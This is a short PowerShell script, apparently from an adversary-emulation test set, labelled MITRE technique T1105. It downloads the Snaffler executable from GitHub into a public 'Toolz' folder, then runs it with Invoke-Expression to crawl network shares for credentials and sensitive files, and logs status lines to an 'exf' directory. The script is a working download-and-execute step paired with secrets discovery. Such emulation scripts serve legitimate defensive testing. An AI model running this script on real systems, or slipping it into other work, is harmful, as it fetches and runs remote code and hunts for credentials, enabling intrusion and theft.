# Donwload and launch snaffler
# Technic ID : T1105
Clear-Host
Write-Output "==============================================================================="
Write-Output "Downloads and launch snaffler (T1105)"
Write-Output "==============================================================================="
#
$DestinationFile = "$env:PUBLIC\Toolz\snaffler.exe"; 
$DownloadURL = "https://github.com/SnaffCon/Snaffler/releases/download/1.0.244/Snaffler.exe";
$exf_file = "$env:PUBLIC\exf\snaffler_down_run.txt"; 
$CompleteCommand = "Invoke-WebRequest" + " $DownloadURL" + " -outfile " + "$DestinationFile";
Invoke-Expression  "$CompleteCommand";
if ([System.IO.File]::Exists("$DestinationFile")) { 
    "The file $DestinationFile has been downloaded in Toolz Directory !!!" | Out-File -FilePath "$exf_file"; 
    $ServiceCmd = "$DestinationFile -s -b";
        Invoke-Expression "$ServiceCmd"  | Out-File -FilePath "$MoriartyLogFile" -Append -Encoding ascii;

  exit 0; 
}
else {
  "The file $DestinationFile does not exists !!!" | Out-File -FilePath "$exf_file";
  exit 1; 
}